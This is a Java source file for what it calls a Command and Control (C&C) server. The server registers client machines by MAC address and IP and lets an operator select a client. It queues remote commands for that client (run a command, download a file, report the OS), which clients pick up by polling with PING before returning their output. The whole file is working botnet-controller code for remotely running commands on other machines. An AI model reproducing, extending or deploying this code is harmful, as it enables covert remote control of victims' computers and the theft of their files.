package server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.HashMap;

import tools.Command;
import tools.Log;
import tools.ParsedCommand;

/**
 * Represents a Command and Control (C&C) server
 * 
 * @author Yohan Chalier
 *
 */
public class CommandServer implements RequestHandler, CommandHandler {
	
	// The string sent when no matching command is found
	public static final String ERROR_COMMAND_NOT_FOUND = "Command not found.";
	
	// The sets of commands for both the server and the client
	private final HashMap<String, Command> cmdsServer;
	private final HashMap<String, Command> cmdsClient;
	
	// The set of connected clients IPs
	private ClientPool clients;
	private int currentClient = -1;
	
	// Current connection
	private Socket currentSocket;
	
	// Log requests
	private Log log;
	
	public CommandServer() {
		log = new Log();
		
		try {
			clients = new ClientPool();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
		cmdsServer = new HashMap<String, Command>();
		cmdsClient = new HashMap<String, Command>();
		
		
		
		// ***** GENERAL SEVER COMMANDS ***** //
		
		// Display available commands
		cmdsServer.put("help", new Command(){
			
			@Override
			public String exec(String[] args) {
				StringBuilder builder = new StringBuilder();
				
				for (String key: cmdsServer.keySet())
					builder.append(key + '\n');
				
				// Removing last '\n'
				builder.setCharAt(builder.length() - 1, (char) 0);
				
				return builder.toString();
			}
			
		});
		
		// Close user input
		cmdsServer.put("exit", new Command(){
			
			@Override
			public String exec(String[] args) {
				return null;
			}
			
		});
		
		// List all connected clients
		cmdsServer.put("list", new Command(){
			
			@Override
			public String exec(String[] args) {
				
				StringBuilder sb = new StringBuilder();
				sb.append("id     MAC address\n");
				
				for (int id: clients.keySet()) {
					sb.append(id + "   "
							+ clients.get(id).getMACAddress() + "\n");
				}
				
				// Removing last '\n'
				sb.setCharAt(sb.length() - 1, (char) 0);
				
				return sb.toString();
			}
			
		});
		
		// Select a client to 'exec' commands
		cmdsServer.put("select", new Command(){
			
			@Override
			public String exec(String[] args) {
				if (args.length != 1)
					return "Usage: select ID";
				currentClient = Integer.parseInt(args[0]);
				return "Selected client " + args[0];
			}
			
		});
		
		// Unselect a client
		cmdsServer.put("unselect", new Command(){

			@Override
			public String exec(String[] args) {
				currentClient = -1;
				return "Client unselected.";
			}
			
		});
		
		// Show log
		cmdsServer.put("log", new Command(){
			
			@Override
			public String exec(String[] args) {
				if (args.length > 0)
					return log.getText(Integer.parseInt(args[0]));
				return log.getText();
			}
			
		});
		
		// Save clients
		cmdsServer.put("save_clients", new Command(){

			@Override
			public String exec(String[] args) {
				
				try {
					return clients.save("clients");
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				return null;
			}
			
		});
		
		// Display client info
		cmdsServer.put("info", new Command(){

			@Override
			public String exec(String[] args) {
				if (currentClient >= 0) {					
					return clients.get(currentClient).toString();
				}
				return "No selected client.";
			}
			
		});
		
		
		
		// ***** CONNECTED CLIENT COMMANDS ***** //
		
		// Execute a command
		cmdsServer.put("exec", new ClientCommand(this, "EXEC"));
		
		// Download a file
		cmdsServer.put("dwnld", new ClientCommand(this, "DWNLD"));
		
		// Retrieve OS
		cmdsServer.put("os", new ClientCommand(this, "OS"));
		
		
		
		// ***** CLIENT REQUESTS COMMANDS ***** //
		
		// Assign an ID to a client
		cmdsClient.put("GETID", new Command(){
			
			@Override
			public String exec(String[] args) {

				ConnectedClient client = clients.findByMac(args[0]);
				int id;
				
				if (client != null) // Already known client
					id = client.getId(); 
				else				// New client
					id = clients.addClient(args[0]);
				
				// Storing IP
				if (currentSocket != null)
					clients.get(id).setInetAddress(
							currentSocket.getInetAddress().toString());
				
				return Integer.toString(id);
			}
			
		});
		
		// Answer a ping
		cmdsClient.put("PING", new Command(){
			
			@Override
			public String exec(String[] args) {
				ConnectedClient client;
				if ((client = clients.identify(args[0])) != null
						&& client.hasCmd()) {
					return client.popCmd();
				}
				return "PONG";
			}
			
		});
		
		cmdsClient.put("OS_OUT", new Command(){

			@Override
			public String exec(String[] args) {
				StringBuilder sb = new StringBuilder();
				for (int i = 1; i < args.length; i++) {
					sb.append(args[i] + (i == args.length - 1 ? "" : " "));
				}
				clients.identify(args[0]).setOs(sb.toString());
				return "";
			}
			
		});
		
	}
	

	@Override
	public String getResponse(Socket socket)
			throws IOException {
		
		currentSocket = socket;
		
		// Reading request
		BufferedReader reader = new BufferedReader(
    			new InputStreamReader(socket.getInputStream()));
		
		StringBuilder builder = new StringBuilder();
		
		// Reading POST header
		String line;
		int contentLength = 0;
		final String contentHeader = "Content-Length: ";
		while (!(line = reader.readLine()).equals("")) {
			if (line.startsWith(contentHeader)) {
				contentLength = Integer.parseInt(
						line.substring(contentHeader.length()));
			}
 		}
		
		// Reading POST body
		int c = 0;
		for (int i = 0; i < contentLength; i++){
			c = reader.read();
			builder.append((char) c);
		}
		String request = builder.toString();

		if (request.startsWith("EXEC_OUT"))
			System.out.println(request);
		else
			log.add(0, socket.getInetAddress() + "\t" + request);
		
		// Executing command
		ParsedCommand pCmd = new ParsedCommand(request);
		if (cmdsClient.containsKey(pCmd.cmd)) {
			String response = cmdsClient.get(pCmd.cmd).exec(pCmd.args);
			log.add(1, socket.getInetAddress() + "\t" + response);
			currentSocket = null;
			return response;
		}
		
		currentSocket = null;
		return ERROR_COMMAND_NOT_FOUND;
	}

	@Override
	public String executeCommand(String cmd) {
		ParsedCommand pCmd = new ParsedCommand(cmd);
		if (cmdsServer.containsKey(pCmd.cmd))
			return cmdsServer.get(pCmd.cmd).exec(pCmd.args);
		return ERROR_COMMAND_NOT_FOUND;
	}

	@Override
	public String getPrefix() {
		if (currentClient >= 0) return Integer.toString(currentClient);
		return "";
	}
	
	public int getCurrentClient() {
		return currentClient;
	}
	
	public ClientPool getClients() {
		return clients;
	}
	
}
